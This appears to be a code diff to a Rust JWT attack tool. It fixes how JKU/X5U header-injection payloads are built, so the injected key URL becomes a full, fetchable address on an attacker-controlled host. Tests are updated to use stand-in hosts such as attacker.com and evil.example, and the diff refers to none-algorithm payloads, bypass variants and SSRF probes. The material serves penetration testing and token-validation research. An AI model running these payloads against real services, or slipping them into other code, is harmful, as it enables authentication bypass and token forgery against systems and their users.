@@ -123,6 +123,20 @@ pub fn generate_none_payload(token: &str, alg_value: &str) -> Result<String> {
     encode_header_with_claims(&header, claims_part)
 }
 
+/// Build a jku/x5u attack URL from a domain and protocol.
+///
+/// `--jwk-attack` is documented as a bare domain (e.g. `evil.com`), which on its
+/// own is not a valid absolute URI. Prepend the configured scheme so the primary
+/// payload is a fetchable URL; if the value already carries a scheme, use it
+/// verbatim to avoid producing a double scheme (e.g. `https://https://…`).
+fn build_attack_url(protocol: &str, domain: &str) -> String {
+    if domain.contains("://") {
+        domain.to_string()
+    } else {
+        format!("{protocol}://{domain}")
+    }
+}
+
 /// Generate JKU and X5U payloads for URL manipulation attacks
 pub fn generate_url_payload(
     token: &str,
@@ -134,10 +148,14 @@ pub fn generate_url_payload(
     let mut payloads = Vec::new();
     let claims_part = extract_claims_part(token)?;
 
-    // Basic payload
+    // Basic payload — build a full attack URL so the jku/x5u value is a valid
+    // absolute URI that honours --jwk-protocol, matching the bypass variants and
+    // the SSRF probes. A bare domain with no scheme is not a fetchable URL, so a
+    // server resolving the header would never reach the attacker's endpoint.
+    let attack_url = build_attack_url(protocol, domain);
     let header = json!({
         "alg": "hs256",
-        key_type: domain,
+        key_type: attack_url,
         "typ": "JWT"
     });
     info!(
@@ -1973,7 +1991,33 @@ mod tests {
             get_header_from_token(&payloads[0]).expect("Failed to decode header from JKU payload");
         assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "hs256"); // Default alg in function
         assert_eq!(header.get("typ").unwrap().as_str().unwrap(), "JWT");
-        assert_eq!(header.get("jku").unwrap().as_str().unwrap(), "attacker.com");
+        // The basic payload must be a full URL honouring --jwk-protocol, not a
+        // bare domain (which is not a fetchable absolute URI).
+        assert_eq!(
+            header.get("jku").unwrap().as_str().unwrap(),
+            "http://attacker.com"
+        );
+    }
+
+    #[test]
+    fn test_generate_url_payload_basic_respects_protocol() {
+        // https default
+        let payloads =
+            generate_url_payload(DUMMY_TOKEN, "jku", "attacker.com", None, "https").unwrap();
+        let hdr = get_header_from_token(&payloads[0]).unwrap();
+        assert_eq!(
+            hdr.get("jku").unwrap().as_str().unwrap(),
+            "https://attacker.com"
+        );
+
+        // A value that already carries a scheme is used verbatim (no double scheme).
+        let payloads =
+            generate_url_payload(DUMMY_TOKEN, "x5u", "http://evil.example", None, "https").unwrap();
+        let hdr = get_header_from_token(&payloads[0]).unwrap();
+        assert_eq!(
+            hdr.get("x5u").unwrap().as_str().unwrap(),
+            "http://evil.example"
+        );
     }
 
     #[test]
@@ -1999,13 +2043,13 @@ mod tests {
             .iter()
             .find(|p| {
                 let hdr = get_header_from_token(p).unwrap();
-                hdr.get("x5u").unwrap().as_str().unwrap() == "attacker.com"
+                hdr.get("x5u").unwrap().as_str().unwrap() == "https://attacker.com"
             })
             .expect("Basic attacker.com payload not found");
         let basic_header = get_header_from_token(basic_payload).unwrap();
         assert_eq!(
             basic_header.get("x5u").unwrap().as_str().unwrap(),
-            "attacker.com"
+            "https://attacker.com"
         );
 
         // Check for one of the bypass payloads (e.g., Z separator)
